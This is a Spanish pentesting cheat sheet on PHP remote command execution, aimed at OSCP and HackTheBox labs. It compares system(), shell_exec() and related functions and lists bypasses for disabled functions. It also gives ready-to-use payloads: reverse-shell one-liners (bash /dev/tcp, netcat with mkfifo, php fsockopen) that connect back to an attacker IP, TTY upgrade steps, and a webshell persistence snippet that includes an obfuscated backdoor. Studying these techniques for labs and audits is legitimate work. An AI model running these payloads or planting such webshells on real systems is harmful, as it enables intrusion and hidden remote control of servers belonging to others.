## 📚 **Índice**

- [[#🟥 1. ¿Qué es RCE en PHP?]]
- [[#🟦 2. Funciones de ejecución de comandos en PHP]]
- [[#🟧 3. system() vs shell_exec() — Diferencia REAL]]
- [[#🟩 4. Cómo lanzar Reverse Shells con PHP]]
- [[#🟫 5. Cómo convertir la reverse shell en una TTY completa]]
- [[#🟪 6. Técnicas reales de explotación en OSCP / HTB]]
- [[#🟦 7. Cómo identificar RCE en auditoría]]
- [[#🟨 8. Persistencia estilo backdoor (para laboratorio)]]
- [[#🧠 9. Resumen profesional]]


---


La ejecución remota de comandos (RCE) en PHP es una de las vulnerabilidades **más críticas y potentes** que puedes encontrar.  
En OSCP, HTB y pentesting real, **el 90% de las veces que explotas PHP** entrarás por una de estas funciones:

- `system()`
    
- `shell_exec()`
    
- `exec()`
    
- `passthru()`
    
- `popen()` / `proc_open()`
    
- `assert()`
    
- `preg_replace()` con `/e` (legacy)
    
- `include` / `require` con LFI + upload
    

Aquí cubrimos:

✔ cómo funcionan  
✔ cuándo usarlas  
✔ cómo usarlas para reverse shells  
✔ diferencias reales  
✔ evasión y bypass  
✔ cómo obtener TTY completa

---

# 🟥 **1. ¿Qué es RCE en PHP?**

RCE = **ejecución remota de comandos del sistema operativo** desde el navegador, manipulando parámetros que recibe el backend.

Ejemplo general:

```
vulnerable.php?cmd=id
```

Si ese parámetro termina dentro de:

```php
system($_GET['cmd']);
```

Tienes acceso TOTAL al sistema OS.

---

# 🟦 **2. Funciones de ejecución de comandos en PHP**

## **2.1 `system()` — la más usada en webshells interactivas**

```php
system($_GET['cmd']);
```

✔ Ejecuta comando  
✔ Imprime salida a medida que se produce  
✔ Muestra errores  
✔ Ideal para debugging → **mejor para reverse shells**

❌ Retorna solo la última línea.

---

## **2.2 `shell_exec()` — la preferida para webshells sigilosas**

```php
echo shell_exec($_GET['cmd']);
```

✔ Captura **toda** la salida como string  
✔ No muestra errores  
✔ Permite procesar salida antes de mostrarla

❌ No imprime en tiempo real  
❌ Puede dificultar debugging  
✔ Perfecta para exfiltración y persistencia oculta

---

## **2.3 `exec()` — salida controlada**

```php
exec($cmd, $output);
```

✔ Guarda cada línea en un array  
✔ No imprime nada a menos que tú lo pidas  
✔ Útil para scripts internos

❌ Menos ideal para explotación directa.

---

## **2.4 `passthru()` — imprime binarios en crudo**

```php
passthru($_GET['cmd']);
```

✔ Perfecto para comandos que producen **salida binaria**  
✔ Se usa en descargas, conversiones, streaming

❌ Más raro de ver vulnerable, pero si aparece… joya.

---

## **2.5 `popen()` / `proc_open()` — control avanzado**

Permiten:

- pipes
    
- stdin / stdout
    
- ejecución bidireccional
    

Se pueden convertir en **backdoors persistentes**.

---

# 🟧 **3. system() vs shell_exec() — Diferencia REAL**

|Característica|`system()`|`shell_exec()`|
|---|---|---|
|Imprime salida en pantalla|Sí|No (devuelve string)|
|Captura stdout completo|No|Sí|
|Captura stderr|A veces|No|
|Ideal para|Reverse shell interactiva|Webshell sigilosa|
|Velocidad|Más rápido|Más lento|
|Feedback para errores|Excelente|Limitado|

📌 **Frase para memorizar:**

> `system()` IMPRIME.  
> `shell_exec()` RETORNA.

---

# 🟩 **4. Cómo lanzar Reverse Shells con PHP**

Una vez tienes RCE, el objetivo es:

✔ conectarte desde el servidor hacia tu máquina  
✔ obtener shell interactiva  
✔ luego convertirla a TTY completa

---

## **4.1 Reverse shell con bash**

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

PHP:

```
?cmd=bash+-c+'bash+-i+>&+/dev/tcp/10.10.14.8/4444+0>&1'
```

---

## **4.2 Reverse shell con netcat tradicional**

```
nc -e /bin/bash ATTACKER 4444
```

---

## **4.3 Reverse shell con netcat sin -e**

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f
```

---

## **4.4 PHP reverse shell (nativa)**

_Esta es importante en OSCP:_

```php
php -r '$sock=fsockopen("10.10.14.8",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

# 🟫 **5. Cómo convertir la reverse shell en una TTY completa**

Una vez te conectas:

```
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Luego:

```
Ctrl + Z
stty raw -echo
fg
reset
export TERM=xterm
```

Ahora tienes:

✔ flechas  
✔ tab  
✔ CTRL+C  
✔ colores  
✔ interacción real

---

# 🟪 **6. Técnicas reales de explotación en OSCP / HTB**

## **6.1 Cuando las funciones están deshabilitadas**

Muchas máquinas tienen:

```
disable_functions = system, exec, shell_exec, passthru
```

### Bypasses:

✔ `assert()` → evalúa como PHP  
✔ `preg_replace('/.*/e', ...)` (legacy)  
✔ `putenv()` + LD_PRELOAD  
✔ `mail()` injection  
✔ `imagecreatefrompng()` → phar deserialization  
✔ `include()` + logs → LFI → RCE  
✔ `FFI` en PHP 7.4+  
✔ wrappers como `php://filter`, `data://`, `phar://`

---

# 🟦 **7. Cómo identificar RCE en auditoría**

Busca:

### ✔ concatenación con valores del usuario:

```php
system($_GET['cmd']);
```

### ✔ llamadas dinámicas:

```php
$func = $_GET['f'];
$func($_GET['cmd']);
```

### ✔ wrappers sospechosos:

```php
include($_GET['page']);
```

### ✔ funcionalidades de “ping", “nslookup", “backup", “export"

Casi SIEMPRE ejecutan comandos internos.

---

# 🟨 **8. Persistencia estilo backdoor (para laboratorio)**

Una vez dentro:

```php
file_put_contents("shell.php", "<?php system(\$_GET['cmd']); ?>");
```

o una variante oculta:

```php
<?php $_="`{{{";"${"_"}($_POST[1]); ?>
```

---

# 🧠 **9. Resumen 

- `system()` → imprime → ideal para reverse shells interactivas.
    
- `shell_exec()` → retorna salida → ideal para webshells “limpias”.
    
- La función **no importa tanto**: lo crítico es **qué variables del usuario** llegan a ella.
    
- El objetivo final SIEMPRE es:  
    **RCE → reverse shell → TTY → escalada → root.**
    

---

